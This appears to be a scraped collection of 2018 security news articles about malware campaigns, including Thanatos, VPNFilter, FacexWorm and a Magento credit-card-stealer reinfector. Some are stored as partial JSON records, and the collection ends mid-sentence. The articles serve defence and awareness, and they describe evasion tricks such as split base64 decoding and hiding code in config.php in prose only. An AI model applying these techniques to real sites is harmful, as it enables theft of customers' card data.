Security researchers at Cisco Talos have discovered a weakness in the Thanatos ransomware code that makes it possible for victims to unlock their Thanatos encrypted files for free without paying any ransom in cryptocurrencies. Like all ransomware threats, Thanatos encrypts files and asks victims to pay for ransom in multiple cryptocurrencies, including Bitcoin Cash, to decrypt their files. \"Multiple versions of Thanatos have been leveraged by attackers, indicating that this is an evolving threat that continues to be actively developed by threat actors with multiple versions having been distributed in the wild,\" the researchers say. \"Unlike other ransomware commonly being distributed, Thanatos does not demand ransom payments to be made using a single cryptocurrency like bitcoin. Instead, it has been observed supporting ransom payments in the form of Bitcoin Cash (BCH), Zcash (ZEC), Ethereum (ETH) and others.\" Once infected, all the encrypted filename extensions on the affected computer are changed to .THANATOS, and then a ransom note pops up whenever the user tries to log on to the system, instructing them to send the ransom money to a hardcoded cryptocurrency wallet address in order to decrypt the files. However, since Thanatos uses different encryption keys to encrypt each file on an infected system without storing them anywhere, it is impossible for malware authors to return users' data, even if the victims pay the ransom. Free Thanatos Ransomware Decryption Tool Cisco researchers analyzed the malware code and found a loophole in the design of the file encryption methodology used by Thanatos, using which they developed a free ransomware decryption tool that will help victims decrypt their files. Dubbed ThanatosDecryptor, the open source, free ransomware decryption tool can be downloaded from the GitHub website, which has recently been acquired by Microsoft for $7.5 billion, and works for Thanatos ransomware versions 1 and 1.1 Since the encryption keys used by Thanatos are derived based upon the number of milliseconds since the system last booted, it was possible for researchers to reverse engineer the logic and re-generate the same 32-bit encryption key using brute force attack and Windows Event Logs. \"Since Thanatos does not modify the file creation dates on encrypted files, the key search space can be further reduced to approximately the number of milliseconds within the 24-hour period leading up to the infection,\" researchers explain. \"At an average of 100,000 brute-force attempts per second (which was the baseline in a virtual machine used for testing), it would take roughly 14 minutes to successfully recover the encryption key in these conditions.\" For more detail about the Thanatos ransomware, you can head on to detailed blog post published by Cisco Talos today. How to Protect Yourself From Ransomware Attacks Most ransomware spread through phishing emails, malicious adverts on websites, and third-party apps and programs. Whether it's Locky, CoinVault, Thanatos, TeslaCrypt, or any other ransomware malware, the protection measures are standard. To safeguard against such ransomware attacks, you should always be suspicious of uninvited documents sent in an email and never click on links inside those documents unless verifying their sources. Check if macros are disabled in your MS Office apps. If not, block macros from running in MS Office files from the Internet. In order to always have a tight grip on all your important documents, keep a good backup routine in place that makes copies of your files to an external storage device which is not always connected to your PC. Moreover, make sure that you run an active behavioral-based antivirus security suite on your system that can detect and block such malware before it can infect your device, and always remember to keep them up-to-date." }

According to researchers from Palo Alto, the hacking group, which they dubbed RANCOR, has been found using two new malware families—PLAINTEE and DDKONG—to target political entities primarily in Singapore and Cambodia. However, in previous years, threat actors behind KHRAT Trojan were allegedly linked to a Chinese cyber espionage group, known as DragonOK. While monitoring the C&C infrastructure associated with KHRAT trojan, researchers identified multiple variants of these two malware families, where PLAINTEE appears to be the latest weapon in the group's arsenal that uses a custom UDP protocol to communicate with its remote command-and-control server. To deliver both PLAINTEE and DDKONG, attackers use spear phishing messages with different infection vectors, including malicious macros inside Microsoft Office Excel file, HTA Loader, and DLL Loader, which includes decoy files. \"These decoys contain details from public news articles focused primarily on political news and events,\" researchers explain. \"Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook.\" Moreover, PLAINTEE downloads and installs additional plugins from its C&C server using the same custom UDP protocol that transmits data in encoded form. \"These families made use of custom network communication to load and execute various plugins hosted by the attackers,\" researchers say. \"Notably the PLAINTEE malware’ use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware.\" On the other hand, DDKONG has been in use by the hacking group since February 2017 and doesn't have any custom communication protocol like PLAINTEE, though it is unclear whether one threat actor or more only use this malware. According to researchers, the final payload of both malware families suggests that the purpose of both malware is to conduct cyber espionage on their political targets; instead of stealing money from their targets. Since RANCOR group is primarily targeting non-tech-savvy users, it is always advised to be suspicious of any uninvited document sent via an email and never click on links inside those documents unless adequately verifying the source. Moreover, most importantly, make use of behavioral-based antivirus software that can detect and block such malware before it can infect your device, and always keep it and other apps up-to-date." }

Dubbed PBot, or PythonBot, the adware was first uncovered more than a year ago, but since then the malware has evolved, as its authors have been trying different money-making schemes to profit themselves, according to researchers at Kaspersky Labs. The previous versions of the PBot malware were designed to perform man-in-the-browser (MITB) attacks to inject unwanted advertising scripts on web pages visited by the victim, but the newer variants have been found installing malicious ad extensions in the web browser. \"Developers are constantly releasing new versions of this modification, each of which complicates the script obfuscation,\" Kaspersky researchers said in their blog post published today. \"Another distinctive feature of this PBot variation is the presence of a module that updates scripts and downloads fresh browser extensions.\" The malware is usually distributed through pop-up advertisements on partner sites, which redirect users to the PBot download page, disguised as legitimate software. Clicking anywhere on the download page eventually drops an \"update.hta\" file on the victim's system, which if opened, downloads the original PBot installer from a remote command-and-control server. Also Read: Learn Python Online — From Scratch to Penetration Testing During installation, the malware drops a folder with the Python 3 interpreter, some Python scripts, and a browser extension on the targeted system. After that, it uses Windows Task Scheduler to execute python scripts when the user signs into the system. PBot consists of \"several Python scripts executed in sequence. In the latest versions of the program, they are obfuscated using Pyminifier,\" the researchers say. If PBot finds any targeted web browsers (Chrome/Opera) installed on the victim's system, it uses \"brplugin.py\" script to generate DLL file and then injects it into the launched browser and install the ad extension. \"The browser extension installed by PBot typically adds various banners to the page, and redirects the user to advertising sites,\" the researchers explain. Although the malware has not been distributed across the globe, it has an alarming number of victims, the majority of which resides in Russia, Ukraine, and Kazakhstan. \"Throughout April, we registered more than 50,000 attempts to install PBot on computers of users of Kaspersky Lab products. The following month this number increased, indicating that this adware is on the rise,\" the researchers say. The best way to protect yourself from avoiding falling victims to such attacks is always to be vigilant while surfing the Internet, and always keep a good antivirus software installed on your computer that can detect and block such threats. Last but not the least, always download apps from trusted sources, like Google Play Store, and stick to verified developers, and do not forget to keep both your devices and software up-to-date." }
{ "_id" : { "$oid" : "5b35bc796cefc42b00293472" }, "Category" : "Malware", "Title" : "Magento Hackers Using Simple Evasion Trick to Reinfect Sites With Malware", "Address" : "https://thehackernews.com/2018/06/magento-security-hacking.html", "Date" : "2018-06-19T20:22:00-11:00", "Article" : "Security researchers have been warning of a new trick that cybercriminals are leveraging to hide their malicious code designed to re-introduce the infection to steal confidential information from Magento based online e-commerce websites. So, if you have already cleaned up your hacked Magento website, there are chances your website is still leaking login credentials and credit card details of your customers to hackers. More than 250,000 online stores use open-source Magento e-commerce platform, which makes them an enticing target for hackers, and therefore the security of both your data and your customer data is of the utmost importance. According to the researchers at Sucuri, who have previously spotted several Magento malware campaigns in the wild, cybercriminals are currently using a simple yet effective method to ensure that their malicious code is added back to a hacked website after it has been removed. To achieve this, criminals are hiding their 'credit card stealer reinfector' code inside the default configuration file (config.php) of Magento website, which gets included on the main index.php and loads with every page view, eventually re-injecting the stealer code into multiple files of the website. Since config.php file gets automatically configured while installing Magento CMS, usually it is not recommended for administrators or website owners to change the content of this file directly. Here's How Magento's Reinfector Code Works The reinfector code spotted by researchers is quite interesting as it has been written in a way that no security scanner can easily identify and detect it, as well as it hardly looks malicious for an untrained eye. Hackers have added 54 extra lines of code in the default configuration file. Here below, I have explained the malicious reinfector code line-by-line, shown in the screenshots, written inside the default config.php file. At line no. 27, attackers set error_reporting() function to false in an attempt to hide errors messages that could reveal the path of the malicious module to site admins. From line no. 31 to 44, there's a function called patch() that has been programmed to append the malicious code for stealing confidential information into legitimate Magento files. This patch() function uses 4 arguments, values of which defines the path of a folder, name of a specific file resides in that path needs to be infected, file size required to check if it is necessary to reinfect the given file, a new file name to be created, and a remote URL from where the malicious code will be downloaded in real-time and injected into the targeted file. From line 50 to 51, attackers have smartly split up the base64_decode() function in multiple parts in order to evade detection from security scanners. The line 52 includes a base64 encoded value that converts to \"http://pastebin.com/raw/\" after getting decoded using the function defined in line 50-51. The next four sets of variables from line 54 to 76 define the four values required to pass arguments to the patch() function mentioned above. The last line of each set includes a random eight character value that concatenated with the link variable encoded in line 52, which eventually generates the final URL from where the patch() function will download the malicious code hosted on remote Pastebin website. From line 78 to 81, attacker finally executes patch() function four times with different values defined in line 54-76 to reinfect website with the credit card stealer. \"As a rule of thumb, on every Magento installation where a compromise is suspected to have taken place, the /includes/config.php should be verified quickly,\" researchers advise. It should be noted that similar technique can also be used against websites based on other content management system platforms such as Joomla and WordPress to hide malicious code. Since attackers mostly exploit known vulnerabilities to compromise websites at the very first place, users are always recommended to keep their website software and servers updated with the latest security patches." }

The group behind it is still alive, kicking and has now been found targeting biological and chemical threat prevention laboratories in Europe and Ukraine, and a few financial organisation in Russia. Earlier this year, an unknown group of notorious hackers targeted Winter Olympic Games 2018, held in South Korea, using a destructive malware that purposely planted sophisticated false flags to trick researchers into mis-attributing the campaign. Unfortunately, the destructive malware was successful to some extent, at least for a next few days, as immediately after the attack various security researchers postmortem the Olympic Destroyer malware and started attributing the attack to different nation-state hacking groups from North Korea, Russia, and China. Later researchers from Russian antivirus vendor Kaspersky Labs uncovered more details about the attack, including the evidence of false attribution artifacts, and concluded that the whole attack was a masterful operation in deception. Now according to a new report published today by Kaspersky Labs, the same group of hackers, which is still unattributed, has been found targeting organisations in Russia, Ukraine, and several European countries in May and June 2018, specifically those organizations that respond to and protect against biological and chemical threats. New Attack Shares Similarities With Olympic Destroyer During their investigation, researchers found that the exploitation and deception tactics used by the newly discovered campaign share many similarities with the Olympic Destroyer attack. \"In May-June 2018 we discovered new spear-phishing documents that closely resembled weaponized documents used by Olympic Destroyer in the past,\" the researchers said. \"They continue to use a non-binary executable infection vector and obfuscated scripts to evade detection.\" Just like Olympic Destroyer, the new attack also targets users affiliated with specific organisations using spear-phishing emails that appear as coming from an acquaintance, with an attached document. If the victims open the malicious document, it leverages macros to download and execute multiple PowerShell scripts in the background and install the final 3rd-stage payload to take remote control over the victims' system. Researchers found that the technique used to obfuscate and decrypt the malicious code is same as used in the original Olympic Destroyer spear-phishing campaign. The second-stage script disables Powershell script logging to avoid leaving traces and then downloads the final \"Powershell Empire agent\" payload, which allows fileless control of the compromised systems over an encrypted communication channel. Hackers Target Biological and Chemical Threat Prevention Laboratories According to the researchers, the group has attempted to gain access to computers in countries, including France, Germany, Switzerland, Russia, and Ukraine. Researchers found evidence of hackers primarily targeting people affiliated with an upcoming biochemical threat conference, called Spiez Convergence, held in Switzerland and organized by Spiez Laboratory. Spiez Laboratory played an essential role in investigating the poisoning in March of a former Russian spy in the UK. The U.K. and the U.S. both said Russia was behind the poisoning and expelled dozens of Russian diplomats. Another document targeted Ministry of Health in Ukraine. It is not yet known that who behind these attacks, but Kaspersky advises all biochemical threat prevention and research organizations to strengthen their IT security and run unscheduled security audits." }
{ "_id" : { "$oid" : "5b35bc806cefc42b00293475" }, "Category" : "Malware", "Title" : "Chinese Hackers Carried Out Country-Level Watering Hole Attack", "Address" : "https://thehackernews.com/2018/06/chinese-watering-hole-attack.html", "Date" : "2018-06-14T04:10:00-11:00", "Article" : "Cybersecurity researchers have uncovered an espionage campaign that has targeted a national data center of an unnamed central Asian country in order to conduct watering hole attacks. The campaign is believed to be active covertly since fall 2017 but was spotted in March by security researchers from Kaspersky Labs, who have attributed these attacks to a Chinese-speaking threat actor group called LuckyMouse. LuckyMouse, also known as Iron Tiger, EmissaryPanda, APT 27 and Threat Group-3390, is the same group of Chinese hackers who was found targeting Asian countries with Bitcoin mining malware early this year. The group has been active since at least 2010 and was behind many previous attack campaigns resulting in the theft of massive amounts of data from the directors and managers of US-based defense contractors. This time the group chose a national data center as its target from an unnamed country in Central Asia in an attempt to gain \"access to a wide range of government resources at one fell swoop.\" According to the researchers, the group injected malicious JavaScript code into the official government websites associated with the data center in order to conduct watering hole attacks. Although LuckyMouse has been spotted using a widely used Microsoft Office vulnerability (CVE-2017-11882) to weaponize Office documents in the past, researchers have no proofs of this technique being used in this particular attack against the data center. The initial attack vector used in the attack against the data center is unclear, but researchers believe LuckyMouse possibly had conducted watering hole or phishing attacks to compromise accounts belonging to employees at the national data center. The attack against the data center eventually infected the targeted system with a piece of malware called HyperBro, a Remote Access Trojan (RAT) deployed to maintain persistence in the targeted system and for remote administration. \"There were traces of HyperBro in the infected data center from mid-November 2017. Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites,\" the researchers said in a blog post published today.\"These events suggest that the data center infected with HyperBro and the waterholing campaign are connected.\"As a result of the waterholing attack, the compromised government websites redirected the country's visitors to either penetration testing suite Browser Exploitation Framework (BeEF) that focuses on the web browser, or the ScanBox reconnaissance framework, which perform the same tasks as a keylogger. The main command and control (C&C) server used in this attack is hosted on an IP address which belongs to a Ukrainian ISP, specifically to a MikroTik router running a firmware version released in March 2016. Researchers believe the Mikrotik router was explicitly hacked for the campaign in order to process the HyperBro malware's HTTP requests without detection." }
{ "_id" : { "$oid" : "5b35bc826cefc42b00293476" }, "Category" : "Malware", "Title" : "Destructive and MiTM Capabilities of VPNFilter Malware Revealed", "Address" : "https://thehackernews.com/2018/06/vpnfilter-router-malware.html", "Date" : "2018-06-06T03:23:00-11:00", "Article" : "It turns out that the threat of the massive VPNFilter botnet malware that was discovered late last month is beyond what we initially thought. Security researchers from Cisco's Talos cyber intelligence have today uncovered more details about VPNFilter malware, an advanced piece of IoT botnet malware that infected more than 500,000 routers in at least 54 countries, allowing attackers to spy on users, as well as conduct destructive cyber operations. Initially, it was believed that the malware targets routers and network-attached storage from Linksys, MikroTik, NETGEAR, and TP-Link, but a more in-depth analysis conducted by researchers reveals that the VPNFilter also hacks devices manufactured by ASUS, D-Link, Huawei, Ubiquiti, QNAP, UPVEL, and ZTE. \"First, we have determined that are being targeted by this actor, including some from vendors that are new to the target list. These new vendors are. New devices were also discovered from Linksys, MikroTik, Netgear, and TP-Lin,\" the researchers say. To hijack devices manufactured by above listed affected vendors, the malware simply relies on publicly-known vulnerabilities or use default credentials, instead of exploiting zero-day vulnerabilities. VPNFilter 'ssler' — Man-in-the-Middle Attack Module Besides this, the researchers primarily shared technical details on a new stage 3 module, named \"ssler,\" which is an advanced network packet sniffer that, if installed, allows hackers to intercept network traffic passing through an infected router and deliver malicious payloads using man-in-the-middle attacks. \"Ssler module provides data exfiltration and JavaScript injection capabilities by intercepting all traffic passing through the device destined for port 80,\" the researchers say. This 3rd-stage module also makes the malware capable of maintaining a persistent presence on an infected device, even after a reboot. The ssler module has been designed to deliver custom malicious payloads for specific devices connected to the infected network using a parameter list, which defines the module's behavior and which websites should be targeted. These parameters include settings to define the location of a folder on the device where stolen data should be stored, the source and destination IP address for creating iptable rules, as well as the targeted URL of the JavaScript injection. To setup packet sniffing for all outgoing web requests on port 80, the module configures the device's iptables immediately after its installation to redirect all network traffic destined for port 80 to its local service listening on port 8888. \"To ensure that these rules do not get removed, ssler deletes them and then adds them back approximately every four minutes,\" the researchers explain. To target HTTPS requests, the ssler module also performs SSLStrip attack, i.e., it downgrades HTTPS connections to HTTP, forcing victim web browsers into communicating over plaintext HTTP. VPNFilter 'dstr' — Device Destruction Module As briefed in our previous article, VPNFilter also has a destructive capability (dstr module) that can be used to render an infected device unusable by deleting files necessary for normal device operation. The malware triggers a killswitch for routers, where it first deliberately kills itself, before deleting the rest of the files on the system [named vpnfilter, security, and tor], possibly in an attempt to hide its presence during the forensic analysis. This capability can be triggered on individual victim machines or en masse, potentially cutting off internet access for hundreds of thousands of victims worldwide. Simply Rebooting Your Router is Not Enough Despite the FBI seizure of a key command and control server right after the discovery of VPNFilter, the botnet still remains active, due to its versatile, multi-stage design. Stage 1 of the malware can survive a reboot, gaining a persistent foothold on the infected device and enabling the deployment of stages 2 and 3 malware. So, each time an infected device is restarted, stages 2 and 3 are re-installed on the device. This means, even after the FBI seized the key C&C server of VPNFilter, hundreds of thousands of devices already infected with the malware, likely remain infected with stage 1, which later installs stages 2 and 3. Therefore, rebooting alone is not enough to completely remove the VPNFilter malware from infected devices, and owners of consumer-grade routers, switches, and network-attached storage devices need to take additional measures, which vary from model to model. For this, router owners are advised to contact their manufacturer. For some devices, resetting routers to factory default could remove the potentially destructive malware, along with removing stage 1, while some devices can be cleaned up with a simple reboot, followed by updating the device firmware. And as I said earlier, mark these words again: if your router cannot be updated, throw it away and buy a new one. Your security and privacy is more than worth a router's price." }

A massive malware campaign designed to target open Redis servers, about which researchers warned almost two months ago, has now grown and already hijacked at least 75% of the total servers running publicly accessible Redis instances. Redis, or REmote DIctionary Server, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. Dubbed RedisWannaMine, a similar malware leveraging same loophole was discovered in late March by data center security vendor Imperva and designed to drop a cryptocurrency mining script on the targeted servers—both database and application. According to Imperva's March blog post, this cryptojacking threat was \"more complex in terms of evasion techniques and capabilities. It demonstrates a worm-like behavior combined with advanced exploits to increase the attackers' infection rate and fatten their wallets.\" A newly published report from the same security firm has now revealed that three-quarters of the open Redis servers accessible from the Internet (over port 6379) contain malicious sets of a key-value pair in the memory, indicating despite multiple warnings administrators continue to leave their servers vulnerable to hackers. Out of total compromised servers, 68 percent systems were found infected using similar keys, named \"backup1, backup2, backup3,\" which were attacked from a medium-sized botnet located at China (86% of IPs), according to the data Imperva collected from their self-set-up publicly available Redis servers to serve as a honeypot. Moreover, the attackers have now found using the compromised servers as a proxy to scan and find vulnerabilities, including SQL injection, cross-site scripting, malicious file uploads, and remote code executions, in other websites. The new attack works by setting a malicious key-value pair in the memory and saving it as a file in the /etc/crontabs folder that forces the server to execute the file. \"Attackers usually set values that include commands to download external remote resource and run it. Another popular type of command is adding SSH keys, so the attacker can remotely access the machine and take it over,\" Nadav Avital, security research team leader at Imperva, explains in a blog post. To protect Redis servers from falling victim to such attacks, administrators are advised never to expose their servers to the Internet, but if required, apply authentication mechanism to prevent unauthorized access. Also, since Redis doesn't use encryption and stores data in plain text, you should never store any sensitive data on these servers. \"Security issues commonly arise when people don’t read the documentation and migrate services to the cloud, without being aware of the consequences or the adequate measures that are needed to do so,\" Avital said." }

Dubbed VPNFilter by the Talos researchers, the malware is a multi-stage, modular platform that targets small and home offices (SOHO) routers and storage devices from Linksys, MikroTik, NETGEAR, and TP-Link, as well as network-access storage (NAS) devices. Meanwhile, the court documents unsealed in Pittsburgh on the same day indicate that the FBI has seized a key web domain communicating with a massive global botnet of hundreds of thousands of infected SOHO routers and other NAS devices. The court documents said the hacking group behind the massive malware campaign is Fancy Bear, a Russian government-aligned hacking group also known as APT28, Sofacy, X-agent, Sednit, Sandworm, and Pawn Storm. The hacking group has been in operation since at least 2007 and has been credited with a long list of attacks over the past years, including the 2016 hack of the Democratic National Committee (DNC) and Clinton Campaign to influence the U.S. presidential election. \"This operation is the first step in the disruption of a botnet that provides the Sofacy actors with an array of capabilities that could be used for a variety of malicious purposes, including intelligence gathering, theft of valuable information, destructive or disruptive attacks, and the misattribution of such activities,\" John Demers, the Assistant Attorney General for National Security, said in a statement. Among other, Talos researchers also found evidence that the VPNFilter source code share code with versions of BlackEnergy—the malware responsible for multiple large-scale attacks targeting devices in Ukraine that the U.S. government has attributed to Russia. VPNFilter has been designed in a way that it could be used to secretly conduct surveillance on its targets and gather intelligence, interfere with internet communications, monitor industrial control or SCADA systems, such as those used in electric grids, other infrastructure and factories, as well as conduct destructive cyber attack operations. The seizure of the domain that is part of VPNFilter's command-and-control infrastructure allows the FBI to redirect attempts by stage one of the malware (in an attempt to reinfect the device) to an FBI-controlled server, which will capture the IP address of infected devices and pass on to authorities around the globe who can remove the malware. Users of SOHO and NAS devices that are infected with VPNFilter are advised to reboot their devices as soon as possible, which eliminates the non-persistent second stage malware, causing the persistent first-stage malware on their infected device to call out for instructions. \"Although devices will remain vulnerable to reinfection with the second stage malware while connected to the Internet, these efforts maximize opportunities to identify and remediate the infection worldwide in the time available before Sofacy actors learn of the vulnerability in their command-and-control infrastructure,\" the DoJ said. Since VPNFilter does not exploit any zero-day vulnerability to infect its victims and instead searches for devices still exposed to known vulnerabilities or having default credentials, users are strongly recommended to change default credentials for their devices to prevent against the malware. Moreover, always put your routers behind a firewall, and turn off remote administration until and unless you really need it. If your router is by default vulnerable and can't be updated, it is time you buy a new one. You need to be more vigilant about the security of your smart IoT devices." }

Cisco's Talos cyber intelligence unit have discovered an advanced piece of IoT botnet malware, dubbed VPNFilter, that has been designed with versatile capabilities to gather intelligence, interfere with internet communications, as well as conduct destructive cyber attack operations. The malware has already infected over 500,000 devices in at least 54 countries, most of which are small and home offices routers and internet-connected storage devices from Linksys, MikroTik, NETGEAR, and TP-Link. Some network-attached storage (NAS) devices known to have been targeted as well. VPNFilter is a multi-stage, modular malware that can steal website credentials and monitor industrial controls or SCADA systems, such as those used in electric grids, other infrastructure and factories. The malware communicates over Tor anonymizing network and even contains a killswitch for routers, where the malware deliberately kills itself. Unlike most other malware that targets internet-of-things (IoT) devices, the first stage of VPNFilter persists through a reboot, gaining a persistent foothold on the infected device and enabling the deployment of the second stage malware. VPNFilter is named after a directory (/var/run/vpnfilterw) the malware creates to hide its files on an infected device. Since the research is still ongoing, Talos researchers \"do not have definitive proof on how the threat actor is exploiting the affected devices,\" but they strongly believe that VPNFilter does not exploit any zero-day vulnerability to infect its victims. Instead, the malware targets devices still exposed to well-known, public vulnerabilities or have default credentials, making compromise relatively straightforward. Talos researchers have high confidence that the Russian government is behind VPNFilter because the malware code overlaps with versions of BlackEnergy—the malware responsible for multiple large-scale attacks targeting devices in Ukraine that the U.S. government has attributed to Russia. Although devices infected with VPNFilter have been found across 54 countries, researchers believe the hackers are targeting specifically Ukraine, following a surge in the malware infections in the country on May 8. \"The malware has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide,\" Talos researcher William Largent said in a blog post. The researchers said they released their findings prior to the completion of their research, due to concern over a potential upcoming attack against Ukraine, which has repeatedly been the victim of Russian cyber attacks, including large-scale power outage and NotPetya. If you are already infected with the malware, reset your router to factory default to remove the potentially destructive malware and update the firmware of your device as soon as possible. You need to be more vigilant about the security of your smart IoT devices. To prevent yourself against such malware attacks, you are recommended to change default credentials for your device. If your router is by default vulnerable and cannot be updated, throw it away and buy a new one, it's that simple. Your security and privacy is more than worth a router's price. Moreover, always put your routers behind a firewall, and turn off remote administration until and unless you really need it." }

Security researchers are again warning users of a new malware campaign that has been active since at least March this year and has already infected more than 100,000 users worldwide. Dubbed Nigelthorn, the malware is rapidly spreading through socially engineered links on Facebook and infecting victims’ systems with malicious browser extensions that steal their social media credentials, install cryptocurrency miners, and engage them in click fraud. The malware was pushed through at least seven different Chrome browser extensions—all were hosted on Google's official Chrome Web Store. These malicious Chrome browser extensions were first discovered by researchers at cybersecurity firm Radware, after a \"well-protected network\" of one of its customers, an unnamed global manufacturing firm, got compromised. According to a report published by Radware, the malware operators are using copies of legitimate Google Chrome extensions and injecting a short obfuscated malicious script into them to bypass Google's extension validation checks. Researchers named the malware \"Nigelthorn\" after one of the malicious extensions which was the copy of popular 'Nigelify' extension designed to replace all pictures on a web page with gifs of 'Nigel Thornberry.' Nigelthorn Propagates Through Links Sent Over Facebook Nigelthorn is spreading through socially engineered links on Facebook, which if clicked redirects victims to fake YouTube page, asking them to download a malicious Chrome extension, to continue playing the video. Once installed, the extension executes a malicious JavaScript code that makes victims' computers part of a botnet. A similar malware, dubbed Digimine, emerged last year that also worked by sending socially engineered links over Facebook Messenger and installed a malicious extension, allowing attackers to access the victims' Facebook profile and spread the same malware to their friends' list via Messenger. We recently wrote about another similar malware campaign, dubbed FacexWorm, that was also distributed by sending socially engineered links over Facebook Messenger and redirected users to fake YouTube page, asking them to install a malicious Chrome extension. NigelThorn Steals Password for Facebook/Instagram Accounts The new malware majorly focuses on stealing credentials for victims' Facebook and Instagram accounts and collecting details from their Facebook accounts. This stolen information is then used to send malicious links to friends of the infected person in an effort to push the same malicious extensions further. If any of those friends click on the link, the whole infection process starts over again. NigelThorn also downloads a publicly available, browser-based cryptocurrency mining tool as a plugin to trigger the infected systems to start mining cryptocurrencies, including Monero, Bytecoin or Electroneum. Over the period of just 6 days, the attackers appeared to generate approximately $1,000 in cryptocurrencies, mostly Monero. Nigelthorn is also persistent as to prevent users from removing the malicious extensions, it automatically closes the malicious extension tab each time the user opens it prevents removal. The malware also blacklists a variety of clean-up tools offered by Facebook and Google and even prevents users from making edits, deleting posts and making comments. List of Malicious Chrome Extensions Here's the name of all seven extensions masquerading as legitimate extensions: Nigelify PwnerLike Alt-j Fix-case Divinity 2 Original Sin: Wiki Skill Popup Keeprivate iHabno Although Google has removed all of the above-listed extensions, if you have installed any of them, you are advised to immediately uninstall it and change passwords for your Facebook, Instagram and as well as for other accounts where you are using the same credentials.

Cybersecurity researchers from Trend Micro are warning users of a malicious Chrome extension which is spreading through Facebook Messenger and targeting users of cryptocurrency trading platforms to steal their accounts’ credentials. Dubbed FacexWorm, the attack technique used by the malicious extension first emerged in August last year, but researchers noticed the malware re-packed a few new malicious capabilities earlier this month. New capabilities include stealing account credentials from websites, like Google and cryptocurrency sites, redirecting victims to cryptocurrency scams, injecting miners on the web page for mining cryptocurrency, and redirecting victims to the attacker's referral link for cryptocurrency-related referral programs. It is not the first malware to abuse Facebook Messenger to spread itself like a worm. Late last year, Trend Micro researchers discovered a Monero-cryptocurrency mining bot, dubbed Digmine, that spreads through Facebook messenger and targets Windows computers, as well as Google Chrome for cryptocurrency mining. Just like Digmine, FacexWorm also works by sending socially engineered links over Facebook Messenger to the friends of an affected Facebook account to redirect victims to fake versions of popular video streaming websites, like, YouTube. It should be noted that FacexWorm extension has only been designed to target Chrome users. If the malware detects any other web browser on the victim's computer, it redirects the user to an innocuous-looking advertisement. How Does the FacexWorm Malware Work If the malicious video link is opened using Chrome browser, FacexWorm redirects the victim to a fake YouTube page, where the user is encouraged to download a malicious Chrome extension as a codec extension to continue playing the video. Once installed, FacexWorm Chrome extension downloads more modules from its command and control server to perform various malicious tasks. \"FacexWorm is a clone of a normal Chrome extension but injected with short code containing its main routine. It downloads additional JavaScript code from the C&C server when the browser is opened,\" the researchers said. \"Every time a victim opens a new webpage, FacexWorm will query its C&C server to find and retrieve another JavaScript code (hosted on a Github repository) and execute its behaviors on that webpage.\" Since the extension takes all the extended permissions at the time of installation, the malware can access or modify data for any websites the user opens. Here below I have listed a brief outline of what FacexWorm malware can perform: To spread itself further like a worm, the malware requests OAuth access token for the Facebook account of the victim, using which it then automatically obtains the victim's friend list and sends that malicious, fake YouTube video link to them as well. Steal the user's account credentials for Google, MyMonero, and Coinhive, when the malware detects that the victim has opened the target website’s login page. FacexWorm also injects cryptocurrency miner to web pages opened by the victim, which utilizes the victim computer's CPU power to mine Cryptocurrency for attackers. FacexWorm even hijacks the user's cryptocurrency-related transactions by locating the address keyed in by the victim and replacing it with the one provided by the attacker. When the malware detects the user has accessed one of the 52 cryptocurrency trading platforms or typed keywords like \"blockchain,\" \"eth-,\" or \"ethereum\" in the URL, FacexWorm will redirect the victim to a cryptocurrency scam webpage to steal user's digital coins. The targeted platforms include Poloniex, HitBTC, Bitfinex, Ethfinex, and Binance, and the wallet Blockchain.info. To avoid detection or removal, the FacexWorm extension immediately closes the opened tab when it detects that the user is opening the Chrome extension management page. The attacker also gets a referral incentive every time a victim registers an account on Binance, DigitalOcean, FreeBitco.in, FreeDoge.co.in, or HashFlare. So far, researchers at Trend Micro have found that FacexWorm has compromised at least one Bitcoin transaction (valued at $2.49) until April 19, but they do not know how much the attackers have earned from the malicious web mining. Cryptocurrencies targeted by FacexWorm include Bitcoin (BTC), Bitcoin Gold (BTG), Bitcoin Cash (BCH), Dash (DASH), ETH, Ethereum Classic (ETC), Ripple (XRP), Litecoin (LTC), Zcash (ZEC), and Monero (XMR). The FacexWorm malware has been found surfacing in Germany, Tunisia, Japan, Taiwan, South Korea, and Spain. But since Facebook Messenger is used worldwide, there are more chances of the malware being spread globally. Chrome Web Store had removed many of the malicious extensions before being notified by Trend Micro researchers, but the attackers keep uploading it back to the store. Facebook Messenger can also detect the malicious, socially engineered links and regularly block the propagation behavior of the affected Facebook accounts, researchers said. Since Facebook Spam campaigns are quite common, users are advised to be vigilant when clicking on links and files provided via the social media site platform." }

For those unaware, keeping your cryptocurrency protected in a wallet on a device which is entirely offline is called cold storage. Since online digital wallets carry different security risks, some people prefer keeping their private keys offline. Air-gapped computers are those that are isolated from the Internet, local networks, Bluetooth and therefore, are believed to be the most secure devices and are difficult to infiltrate or exfiltrate. If you are new to this topic, we recommend reading our previous articles, detailing how highly-motivated attackers can use specially designed malware to exfiltrate data from an air-gapped computer via light, sound, heat, electromagnetic, magnetic, infrared, and ultrasonic waves. For BeatCoin experiment, Dr. Guri deployed malware on an air-gapped computer that runs a Bitcoin wallet application and then performed each attack vector one-by-one to transmit the wallet keys to a nearby device over covert channels. \"In the adversarial attack model, the attacker infiltrates the offline wallet, infecting it with malicious code,\" the paper [PDF] reads. \"The malware can be pre-installed or pushed in during the initial installation of the wallet, or it can infect the system when removable media (e.g., USB flash drive) is inserted into the wallet’s computer in order to sign a transaction. These attack vectors have repeatedly been proven feasible in the last decade.\" Results shown in the above chart suggests AirHopper, MOSQUITO, and Ultrasonic techniques are the fastest way to transmit a 256-bit private key to a remote receiver, whereas, Diskfiltration and Fansmitter methods take minutes. Guri has also shared two videos. The first one demonstrates exfiltration of private keys from an air-gapped computer, which hardly took a few seconds to transmit data to a nearby smartphone using ultrasonic waves. In the second video, the researcher transmitted private keys stored on a Raspberry Pi device to the nearby smartphone using the RadIoT attack—a technique to exfiltrate data from air-gapped internet-of-things (IoT) and embedded devices via radio signals. \"The radio signals - generated from various buses and general-purpose input/output (GPIO) pins of the embedded devices - can be modulated with binary data. In this case, the transmissions can be received by an AM or FM receiver located nearby the device.\" In the last research published earlier this month, Guri’s team also demonstrated how hackers could use power fluctuations in the current flow 